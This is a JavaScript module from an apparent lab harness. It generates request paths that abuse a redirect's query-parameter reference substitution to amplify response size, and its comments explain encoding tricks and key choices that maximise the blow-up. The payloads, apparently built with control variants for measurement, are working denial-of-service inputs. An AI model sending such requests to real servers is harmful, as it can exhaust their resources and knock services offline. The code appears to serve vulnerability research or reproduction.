// Request targets for the lab. The output is references x serialized length of the value
// they point at, so half the bytes buy `:z` references and half buy the `z` value.
//
//   /restaurant/<head>%3F<key>=:z&<key>=:z...&/menu?z=<fill>&meal=x
//
// The redirect returns `/restaurant/${location}/menu/${meal}`, so `%3F` inside `location`
// opens a query and each `<key>=:z` after it references `z`. A raw `&` is legal in a path
// segment, so a reference costs about 6 bytes. The fill is `=`, which `encodeUriQuery`
// writes back as `%3D`: three bytes out per byte in, the most for any byte Node accepts.
// Keys are distinct, since a repeated key parses to an array and arrays are not substituted.
const KEY_CHARS =
  "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-._~!$'*,:@";

function* keyNames() {
  for (const a of KEY_CHARS) yield a;
  for (const a of KEY_CHARS) for (const b of KEY_CHARS) yield a + b;
  for (const a of KEY_CHARS) for (const b of KEY_CHARS) for (const c of KEY_CHARS) yield a + b + c;
}

// The redirect only amplifies when its destination is routable:
//   catchAll     -> /restaurant/x?<query>, needs the `**` route
//   destination  -> /restaurant/a/menu/lunch?<query>, the guide's own lunch route
const HEADS = { catchAll: '/restaurant/x%3F', destination: '/restaurant/a%2Fmenu%2Flunch%3F' };

// `casePrefix` aims the request at a case route (cases.mjs). `mealValue` pins the branch so
// the result does not depend on the hour; a case that puts it in the path needs 'lunch'.
export function payload(targetBytes, control, land = 'destination', casePrefix = '', mealValue = 'x') {
  const sigil = control ? '@' : ':';
  const head = casePrefix + (HEADS[land] ?? HEADS.catchAll);
  const tail = '/menu?z=';
  const meal = `&meal=${mealValue}`;
  // Half the budget buys references; `refBytes` is measured on the wire.
  const refBytes = Math.round((targetBytes - head.length - tail.length - meal.length) / 2);
  const refs = [];
  let spent = 0;
  for (const key of keyNames()) {
    const ref = `${refs.length ? '&' : ''}${key}=${sigil}z`;
    if (spent + ref.length + 1 > refBytes) break; // +1 for the closing '&'
    refs.push(ref);
    spent += ref.length;
  }
  const prefix = head + refs.join('') + '&' + tail;
  const fillBytes = targetBytes - prefix.length - meal.length;
  if (fillBytes <= 0) throw new Error(`targetBytes ${targetBytes} is too small`);
  const path = prefix + '='.repeat(fillBytes) + meal;
  return { path, markers: refs.length, refs: refs.length, fillBytes };
}

// Second generator, for the cases that forward the query string: the references are
// ordinary query parameters of the request.
//
//   /<case>/restaurant/d/menu?z=<fill>&<key>=:z&<key>=:z...
//
// A bare `:` is legal in a query value, so nothing is percent-encoded by the request.
// `encodeURIComponent` writes it as `%3A` and parsing the redirect decodes it back before
// the `:` test, so encoding changes nothing. Keys start with a letter, so none is
// integer-like (#70908), and skip FILL_KEY, since a repeated key parses to an array.
const LETTERS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
const TAIL_CHARS = LETTERS + '0123456789';
const FILL_KEY = 'z';

function* queryKeyNames() {
  for (const a of LETTERS) if (a !== FILL_KEY) yield a;
  for (const a of LETTERS) for (const b of TAIL_CHARS) yield a + b;
  for (const a of LETTERS) for (const b of TAIL_CHARS) for (const c of TAIL_CHARS) yield a + b + c;
}

export function queryPayload(targetBytes, control, caseName) {
  const sigil = control ? '@' : ':';
  const head = `/${caseName}/restaurant/d/menu?${FILL_KEY}=`;
  const budget = targetBytes - head.length;
  if (budget <= 0) throw new Error(`targetBytes ${targetBytes} is too small for ${caseName}`);
  // Half the budget buys references, half buys the value they point at.
  const refBytes = Math.round(budget / 2);
  const refs = [];
  let spent = 0;
  for (const key of queryKeyNames()) {
    const ref = `&${key}=${sigil}${FILL_KEY}`;
    if (spent + ref.length > refBytes) break;
    refs.push(ref);
    spent += ref.length;
  }
  const fillBytes = budget - spent;
  if (fillBytes <= 0) throw new Error(`targetBytes ${targetBytes} is too small for ${caseName}`);
  const path = head + '='.repeat(fillBytes) + refs.join('');
  return { path, markers: refs.length, refs: refs.length, fillBytes };
}
